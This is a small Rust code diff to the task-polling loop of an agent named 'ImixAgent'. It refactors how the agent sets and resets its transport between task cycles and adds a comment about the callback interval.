@@ -40,6 +40,7 @@ pub async fn run_agent() -> Result<()> {
 
     // Track the last interval we slept for, as a fallback in case we fail to read the config
     let mut last_interval = agent.get_callback_interval_u64().unwrap_or(5);
+    // Do we need to move this into the loop and check the agent_ref?
 
     #[cfg(debug_assertions)]
     log::info!("Agent initialized");
@@ -106,7 +107,7 @@ async fn run_agent_cycle(agent: Arc<ImixAgent>, registry: Arc<TaskRegistry>) {
     };
 
     // Set transport
-    agent.update_transport(Some(transport)).await;
+    agent.update_transport(transport).await;
 
     // Claim Tasks
     process_tasks(&agent, &registry).await;
@@ -114,8 +115,8 @@ async fn run_agent_cycle(agent: Arc<ImixAgent>, registry: Arc<TaskRegistry>) {
     // Flush Outputs (send all buffered output)
     agent.flush_outputs().await;
 
-    // Disconnect (drop transport)
-    agent.update_transport(None).await;
+    // Disconnect (reset to empty transport)
+    agent.update_transport(transport::init_transport()).await;
 }
 
 async fn process_tasks(agent: &ImixAgent, _registry: &TaskRegistry) {
